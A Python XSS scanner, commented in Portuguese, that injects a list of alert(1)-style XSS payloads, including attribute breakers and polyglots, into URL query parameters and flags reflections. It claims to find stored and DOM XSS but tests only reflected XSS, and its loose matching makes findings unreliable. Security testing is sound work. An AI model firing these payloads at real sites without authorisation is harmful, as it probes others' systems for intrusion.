#!/usr/bin/env python3
"""
LIBERTUS XSS HUNTER

Detecta TODOS os tipos de XSS:
1. Reflected XSS
2. Stored XSS
3. DOM-based XSS
4. XSS via HTML attributes
5. XSS via JavaScript contexts
"""

import asyncio
import aiohttp
from typing import List, Dict
import re
from urllib.parse import urlparse, parse_qs, urlencode


class LibertusXSSHunter:
    """Caçador profissional de XSS"""
    
    def __init__(self):
        # Payloads por contexto
        self.payloads = {
            'basic': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "<iframe src=javascript:alert(1)>",
            ],
            'attribute_breaking': [
                "' onmouseover='alert(1)'",
                '" onmouseover="alert(1)"',
                "'><script>alert(1)</script>",
                "\"><script>alert(1)</script>",
            ],
            'javascript_context': [
                "';alert(1);//",
                "\";alert(1);//",
                "</script><script>alert(1)</script>",
            ],
            'dom_based': [
                "#<img src=x onerror=alert(1)>",
                "#'><script>alert(1)</script>",
            ],
            'polyglots': [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            ]
        }
    
    async def hunt(self, url: str) -> List[Dict]:
        """Caça XSS em URL"""
        
        vulnerabilities = []
        
        print(f"🎯 Hunting XSS: {url}")
        
        # Parse URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("   ⚠️ Nenhum parâmetro para testar")
            return vulnerabilities
        
        # Testa cada parâmetro
        for param_name in params.keys():
            print(f"   🔍 Testing parameter: {param_name}")
            
            # Reflected XSS
            vulns = await self._test_reflected(url, param_name)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_reflected(self, url: str, param: str) -> List[Dict]:
        """Testa reflected XSS"""
        
        vulnerabilities = []
        
        async with aiohttp.ClientSession() as session:
            # Testa todos payloads
            for category, payloads in self.payloads.items():
                for payload in payloads:
                    test_url = self._inject_payload(url, param, payload)
                    
                    try:
                        async with session.get(test_url, timeout=5) as resp:
                            content = await resp.text()
                            
                            # Verifica se payload refletiu
                            if self._is_reflected(payload, content):
                                # Verifica se executaria
                                if self._would_execute(payload, content):
                                    vulnerabilities.append({
                                        'type': 'xss_reflected',
                                        'category': category,
                                        'param': param,
                                        'payload': payload,
                                        'url': url,
                                        'evidence': 'Payload reflected and would execute',
                                        'severity': 'HIGH'
                                    })
                                    
                                    print(f"      💥 REFLECTED XSS FOUND!")
                                    print(f"         Category: {category}")
                                    print(f"         Payload: {payload[:50]}...")
                    
                    except:
                        continue
        
        return vulnerabilities
    
    def _is_reflected(self, payload: str, content: str) -> bool:
        """Verifica se payload foi refletido"""
        
        # Procura payload exato ou partes dele
        if payload in content:
            return True
        
        # Procura partes importantes do payload
        key_parts = [
            'alert',
            'onerror',
            'onload',
            '<script',
            '<img',
            '<svg',
            'javascript:'
        ]
        
        for part in key_parts:
            if part in payload.lower() and part in content.lower():
                return True
        
        return False
    
    def _would_execute(self, payload: str, content: str) -> bool:
        """Verifica se payload executaria JavaScript"""
        
        # Patterns que indicam execução
        execution_patterns = [
            r'<script[^>]*>' + re.escape(payload),
            r'<[^>]+on\w+=["\']?' + re.escape(payload),
            r'<img[^>]+onerror=["\']?alert',
            r'<svg[^>]+onload=["\']?alert',
            r'javascript:alert',
        ]
        
        for pattern in execution_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # Verifica contexto não sanitizado
        if payload in content:
            # Não está dentro de tag HTML escaped
            if '&lt;' not in content or '&gt;' not in content:
                return True
        
        return False
    
    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """Injeta payload no parâmetro"""
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        params[param] = [payload]
        
        new_query = urlencode(params, doseq=True, safe='/:@!$&\'()*+,;=')
        new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        
        return new_url


async def main():
    """Teste"""
    hunter = LibertusXSSHunter()
    
    test_url = "https://example.com/search?q=test&page=1"
    
    vulns = await hunter.hunt(test_url)
    
    print("\n" + "="*60)
    print(f"✅ XSS vulnerabilities found: {len(vulns)}")
    
    for vuln in vulns:
        print(f"\n🎯 {vuln['type'].upper()}")
        print(f"   Category: {vuln['category']}")
        print(f"   Parameter: {vuln['param']}")


if __name__ == "__main__":
    asyncio.run(main())
